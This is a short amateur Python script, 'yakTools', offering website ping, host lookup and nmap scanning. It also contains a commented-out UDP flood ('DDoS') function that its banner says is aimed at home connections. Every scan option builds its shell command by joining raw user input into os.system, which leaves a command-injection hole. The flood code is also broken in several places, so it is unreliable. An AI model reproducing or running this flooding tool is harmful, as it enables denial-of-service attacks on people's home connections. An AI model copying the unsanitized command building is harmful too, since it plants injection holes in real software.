#Website Tools
#Created by YMF
#Follow me on Twitter @YakMasterFlash


import os
import sys
import time
import socket
import random


print("          _______  _______ ")
print("|\     /|(       )(  ____ \\")
print("( \   / )| () () || (    \/")
print(" \ (_) / | || || || (__    ")
print("  \   /  | |(_)| ||  __)   ")
print("   ) (   | |   | || (      ")
print("   | |   | )   ( || )      ")
print("   \_/   |/     \||/       ")
print("                           ")
print("Welcome to yakTools v1.0")
print("FOLLOW ME ON TWITTER @YakMasterFlash\n\n\n")
def main_menu():
  print("Main Menu:")
  print("[1] Target (Use to select website)")
  print("[2] Ping")
  print("[3] Get IP Address")
  print("[4] Nmap Scan")
  #print("[5] DDoS TOOL!")
  print("Type 'exit' to close.")
  user_input = input("Please select an option using its number: ")
  if user_input == "1":
    target()
  elif user_input == "2":
    ping()
  elif user_input == "3":
    ip_address()
  elif user_input == "4":
    nmap()
  elif user_input == "5":
    ddos()
  elif user_input == "exit":
    pass
  else:
    print("\nPlease enter 1, 2, 3, or 'exit'")
    main_menu()

#def is_url():
 # validators.domain.domain(site)

def target():
  print("Target function called")
  global site
  site = input("Please enter a website: ")
  print("\nTarget set to: " + site + "!\n")
  main_menu()
  
def ping():
  print("\nPing Function Declared!\n")
  test = os.system("ping " + site)
  time.sleep(1)
  print(test)
  main_menu()
  
def ip_address():
  print("\nHost Function Declared!\n")
  addr = os.system("host " + site)
  print(addr)
  main_menu()

def nmap():
  print("\nNmap Function Declared!\n")
  version = os.system("which nmap")
  if version == 0:
    os.system("nmap -sV -Pn -vv " + site)
    main_menu()
  else:
    print("\nnmap is not installed, please install it first!")
    main_menu()

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bites = random._urandom(1024)


"""
def ddos():
  os.system("clear")
  print("          _______  _______ ")
  print("|\     /|(       )(  ____ \\")
  print("( \   / )| () () || (    \/")
  print(" \ (_) / | || || || (__    ")
  print("  \   /  | |(_)| ||  __)   ")
  print("   ) (   | |   | || (      ")
  print("   | |   | )   ( || )      ")
  print("   \_/   |/     \||/       ")
  print("                           ")
  print("Welcome to my DDoS Tool!")
  print("This is meant to be used on a VPS with at least 5gb/s port speed!")
  print("This is meant ONLY FOR HOME CONNECTIONS!")
  print("THIS WILL NOT TAKE DOWN WEBSITES!")
  print("FOLLOW ME ON TWITTER @YakMasterFlash\n\n\n")

  attk = input("Please enter the IP address to attack: ")
  attk2 = input("Please enter the port to attack (usually 80): ")
  dur = input("Length of time to attack: ")
  timeout = time.time() + dur
  sent = 0

  while True:
    try:
      if time.time() > timeout:
        break
      else:
        pass
      sock.sendto(bites, (attk, attk2))
      sent = sent + 1
      print("Sent %s packets to %s on port %s")%(sent, attk, attk2)
    except KeyboardInterrupt:
      sys.exit()
      main_menu()
"""
main_menu()